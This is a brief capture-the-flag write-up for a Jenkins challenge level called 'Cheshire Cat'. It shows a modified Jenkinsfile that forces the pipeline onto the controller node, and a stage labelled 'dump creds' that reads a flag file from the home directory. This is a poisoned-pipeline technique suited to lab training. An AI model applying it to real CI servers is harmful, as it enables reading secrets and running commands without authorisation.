# Cheshire Cat

Our git user `thealice` has read/write access to the `Wonderland/cheshire-cat` repository. 

The description of the flag suggests it is located specifically on the Jenkins controller node itself.

Sine we can modify the Jenkinsfile and have it run, we can just force it to run on the controller node and dump the file:

```Jenkinsfile
pipeline {
    agent { label 'built-in' }
    environment {
        PROJECT = "sanic"
    }

    stages {
        stage('dump creds') {
            steps {
                sh """
                    cat ~/flag5.txt
                """
            }
        }
    }

    post {
        always {
            cleanWs()
        }
    }
}
```
